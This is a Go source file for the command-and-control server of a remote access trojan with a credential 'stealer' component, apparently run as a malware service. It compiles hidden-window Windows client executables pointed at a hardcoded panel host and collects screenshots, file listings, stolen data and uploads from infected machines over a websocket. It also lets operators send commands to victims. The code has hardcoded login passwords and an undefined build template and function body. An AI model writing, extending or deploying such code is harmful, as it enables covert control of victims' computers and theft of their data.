package main

import (
	"archive/zip"
	"encoding/base64"
	"encoding/json"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

func BuildClient(serverHost string) error

type Message struct {
	Type string `json:"type"`
	Data string `json:"data"`
	Name string `json:"name,omitempty"`
}

type Client struct {
	ID      string
	Conn    *websocket.Conn
	BuildID string
	Owner   string
}

type Build struct {
	ID      string
	Owner   string
	Host    string
	Created time.Time
}

var (
	clients      = make(map[string]*Client)
	clientsMu    sync.RWMutex
	admins       = make(map[*websocket.Conn]bool)
	adminsMu     sync.Mutex
	upgrader     = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
	sessions     = make(map[string]string)
	sessionsMu   sync.RWMutex
	builds       = make(map[string]*Build)
	buildsMu     sync.RWMutex
	userBuilds   = make(map[string][]string) // owner -> buildIDs
	userBuildsMu sync.RWMutex
	users        = map[string]string{
		"admin": "admin123",
		"user1": "pass1",
	}
)

func main() {
	_ = os.MkdirAll("stealer", 0755)

	r := mux.NewRouter()
	r.HandleFunc("/login", loginHandler).Methods("POST")
	r.Handle("/admin", authMiddleware(http.HandlerFunc(adminWSHandler)))
	r.Handle("/clients", authMiddleware(http.HandlerFunc(getClientsHandler))).Methods("GET")
	r.Handle("/send/{id}", authMiddleware(http.HandlerFunc(sendCommandHandler))).Methods("POST")
	r.Handle("/apps/{file}", http.StripPrefix("/apps/", http.FileServer(http.Dir("./apps"))))
	r.Handle("/builds", authMiddleware(http.HandlerFunc(createBuildHandler))).Methods("POST")
	r.Handle("/builds", authMiddleware(http.HandlerFunc(listBuildsHandler))).Methods("GET")
	r.Handle("/builds/{id}", authMiddleware(http.HandlerFunc(downloadBuildHandler))).Methods("GET")
	r.HandleFunc("/ws", wsHandler)
	r.PathPrefix("/").Handler(http.HandlerFunc(staticOrLogin))

	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}
	log.Println("Starting RAT server on port", port)
	http.ListenAndServe(":"+port, r)
}

func createBuildHandler(w http.ResponseWriter, r *http.Request) {
	cookie, _ := r.Cookie("session")
	sessionsMu.RLock()
	owner := sessions[cookie.Value]
	sessionsMu.RUnlock()

	buildID := uuid.New().String()
	build := &Build{
		ID:      buildID,
		Owner:   owner,
		Host:    "https://panel-agzz.onrender.com", // Фиксированный хост
		Created: time.Now(),
	}

	buildsMu.Lock()
	builds[buildID] = build
	buildsMu.Unlock()

	userBuildsMu.Lock()
	userBuilds[owner] = append(userBuilds[owner], buildID)
	userBuildsMu.Unlock()

	// Генерируем клиент с фиксированным хостом
	tmpDir := filepath.Join("builds", buildID)
	_ = os.MkdirAll(tmpDir, 0755)
	tmpFile := filepath.Join(tmpDir, "client.go")

	code := strings.ReplaceAll(template, "YOUR_SERVER_IP", "panel-agzz.onrender.com")
	if err := os.WriteFile(tmpFile, []byte(code), 0644); err != nil {
		http.Error(w, "failed to create build file", http.StatusInternalServerError)
		return
	}

	// Компилируем клиент
	cmd := exec.Command("go", "build", "-ldflags", "-H=windowsgui", "-o", "client.exe", "client.go")
	cmd.Dir = tmpDir
	cmd.Env = append(os.Environ(), "CGO_ENABLED=1", "GOOS=windows", "GOARCH=amd64")
	if err := BuildClient("panel-agzz.onrender.com"); err != nil {
		http.Error(w, "build failed: "+err.Error(), http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusCreated)
	json.NewEncoder(w).Encode(map[string]string{"id": buildID})
}

func listBuildsHandler(w http.ResponseWriter, r *http.Request) {
	cookie, _ := r.Cookie("session")
	sessionsMu.RLock()
	owner := sessions[cookie.Value]
	sessionsMu.RUnlock()

	userBuildsMu.RLock()
	buildIDs := userBuilds[owner]
	userBuildsMu.RUnlock()

	buildsMu.RLock()
	defer buildsMu.RUnlock()

	var result []*Build
	for _, id := range buildIDs {
		if build, exists := builds[id]; exists {
			result = append(result, build)
		}
	}

	json.NewEncoder(w).Encode(result)
}

func downloadBuildHandler(w http.ResponseWriter, r *http.Request) {
	buildID := mux.Vars(r)["id"]

	buildsMu.RLock()
	build, exists := builds[buildID]
	buildsMu.RUnlock()

	if !exists {
		http.Error(w, "build not found", http.StatusNotFound)
		return
	}

	cookie, _ := r.Cookie("session")
	sessionsMu.RLock()
	owner := sessions[cookie.Value]
	sessionsMu.RUnlock()

	if build.Owner != owner {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}

	exePath := filepath.Join("builds", buildID, "client.exe")
	http.ServeFile(w, r, exePath)
}

func loginHandler(w http.ResponseWriter, r *http.Request) {
	var creds struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}
	if err := json.NewDecoder(r.Body).Decode(&creds); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	if users[creds.Username] != creds.Password {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	sid := uuid.New().String()
	sessionsMu.Lock()
	sessions[sid] = creds.Username
	sessionsMu.Unlock()
	http.SetCookie(w, &http.Cookie{
		Name:     "session",
		Value:    sid,
		Path:     "/",
		HttpOnly: true,
		MaxAge:   86400,
	})
	w.WriteHeader(http.StatusOK)
}

func authMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		cookie, err := r.Cookie("session")
		if err != nil || !validSession(cookie.Value) {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		next.ServeHTTP(w, r)
	})
}

func validSession(sid string) bool {
	sessionsMu.RLock()
	defer sessionsMu.RUnlock()
	_, ok := sessions[sid]
	return ok
}

func staticOrLogin(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path == "/" || r.URL.Path == "/index.html" {
		cookie, err := r.Cookie("session")
		if err != nil || !validSession(cookie.Value) {
			http.ServeFile(w, r, "ui/login.html")
			return
		}
	}
	http.FileServer(http.Dir("./ui")).ServeHTTP(w, r)
}

func wsHandler(w http.ResponseWriter, r *http.Request) {
	if r.URL.Query().Get("key") != "supersecret" {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}

	buildID := r.URL.Query().Get("build_id")
	if buildID == "" {
		http.Error(w, "build_id required", http.StatusBadRequest)
		return
	}

	buildsMu.RLock()
	build, exists := builds[buildID]
	buildsMu.RUnlock()

	if !exists {
		http.Error(w, "invalid build_id", http.StatusBadRequest)
		return
	}

	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("upgrade error:", err)
		return
	}
	id := strings.ReplaceAll(r.RemoteAddr, ":", "_")
	client := &Client{
		ID:      strings.ReplaceAll(r.RemoteAddr, ":", "_"),
		Conn:    conn,
		BuildID: buildID,
		Owner:   build.Owner,
	}
	clientsMu.Lock()
	clients[id] = client
	clientsMu.Unlock()
	log.Println("Client connected:", id)

	defer func() {
		clientsMu.Lock()
		delete(clients, id)
		clientsMu.Unlock()
		conn.Close()
		log.Println("Client disconnected:", id)
	}()

	for {
		var msg Message
		if err := conn.ReadJSON(&msg); err != nil {
			log.Println("read error from client:", err)
			break
		}
		log.Printf("Received from client [%s]: %s\n", id, msg.Type)

		switch msg.Type {
		case "result", "screen", "explorer", "stealer":
			broadcastToAdmins(msg)

		case "upload":
			var payload struct {
				Filename string `json:"filename"`
				Content  string `json:"content"`
			}
			if err := json.Unmarshal([]byte(msg.Data), &payload); err != nil {
				log.Println("upload JSON parse error:", err)
				continue
			}
			data, err := decodeBase64(payload.Content)
			if err != nil {
				log.Println("upload base64 decode error:", err)
				continue
			}
			if err := os.WriteFile(payload.Filename, data, 0644); err != nil {
				log.Println("upload write file error:", err)
			} else {
				log.Printf("Saved uploaded file: %s\n", payload.Filename)
			}
		}

	}
}

func decodeBase64(s string) ([]byte, error) {
	return io.ReadAll(base64.NewDecoder(base64.StdEncoding, strings.NewReader(s)))
}

func adminWSHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("admin ws upgrade error:", err)
		return
	}
	adminsMu.Lock()
	admins[conn] = true
	adminsMu.Unlock()
	log.Println("Admin connected")

	defer func() {
		adminsMu.Lock()
		delete(admins, conn)
		adminsMu.Unlock()
		log.Println("Admin disconnected")
		conn.Close()
	}()

	for {
		_, _, err := conn.ReadMessage()
		if err != nil {
			break
		}
	}
}

func broadcastToAdmins(msg Message) {
	adminsMu.Lock()
	defer adminsMu.Unlock()
	for conn := range admins {
		err := conn.WriteJSON(msg)
		if err != nil {
			log.Println("broadcast error:", err)
			conn.Close()
			delete(admins, conn)
		}
	}
}

func getClientsHandler(w http.ResponseWriter, r *http.Request) {
	cookie, _ := r.Cookie("session")
	sessionsMu.RLock()
	owner := sessions[cookie.Value]
	sessionsMu.RUnlock()

	clientsMu.RLock()
	defer clientsMu.RUnlock()

	var result []struct {
		ID      string `json:"id"`
		BuildID string `json:"build_id"`
	}

	for _, client := range clients {
		if client.Owner == owner {
			result = append(result, struct {
				ID      string `json:"id"`
				BuildID string `json:"build_id"`
			}{
				ID:      client.ID,
				BuildID: client.BuildID,
			})
		}
	}

	json.NewEncoder(w).Encode(result)
}

func sendCommandHandler(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]

	clientsMu.RLock()
	client, ok := clients[id]
	clientsMu.RUnlock()

	if !ok {
		http.Error(w, "client not found", http.StatusNotFound)
		return
	}

	cookie, _ := r.Cookie("session")
	sessionsMu.RLock()
	owner := sessions[cookie.Value]
	sessionsMu.RUnlock()

	if client.Owner != owner {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}

	var msg Message
	if err := json.NewDecoder(r.Body).Decode(&msg); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	if err := client.Conn.WriteJSON(msg); err != nil {
		http.Error(w, "failed to send", http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

func addToZip(zipWriter *zip.Writer, path string, name string) {
	file, err := os.Open(path)
	if err != nil {
		log.Println("zip open error:", err)
		return
	}
	defer file.Close()
	wr, err := zipWriter.Create(name)
	if err != nil {
		log.Println("zip create entry error:", err)
		return
	}
	_, err = io.Copy(wr, file)
	if err != nil {
		log.Println("zip copy error:", err)
	}
}
